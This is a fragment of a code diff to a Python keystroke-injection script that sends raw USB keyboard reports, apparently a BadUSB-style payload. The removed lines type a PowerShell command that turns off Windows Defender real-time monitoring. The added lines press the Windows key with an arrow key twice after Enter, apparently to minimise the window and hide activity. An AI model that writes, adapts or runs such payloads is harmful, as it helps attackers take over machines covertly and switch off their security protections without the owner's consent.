@@ -201,12 +201,7 @@ write_report(NULL_CHAR*8)
 time.sleep(0.5)
 # press enter
 write_report(NULL_CHAR*2 + chr(40) + NULL_CHAR*5)
-
 write_report(NULL_CHAR*8)
-time.sleep(0.5)
-
-for i in "Set-MpPreference -DisableRealtimeMonitoring $true":
-    send(i)
 
 time.sleep(0.5)
 # press enter
@@ -225,7 +220,13 @@ time.sleep(0.5)
 
 # press enter
 write_report(NULL_CHAR*2 + chr(40) + NULL_CHAR*5)
-
+write_report(NULL_CHAR*8)
+time.sleep(0.5)
+write_report(chr(8) + NULL_CHAR + chr(81) + NULL_CHAR*5)
+write_report(NULL_CHAR*8)
+time.sleep(0.5)
+write_report(chr(8) + NULL_CHAR + chr(81) + NULL_CHAR*5)
+write_report(NULL_CHAR*8)
 
 # release all keys
 write_report(NULL_CHAR*8)
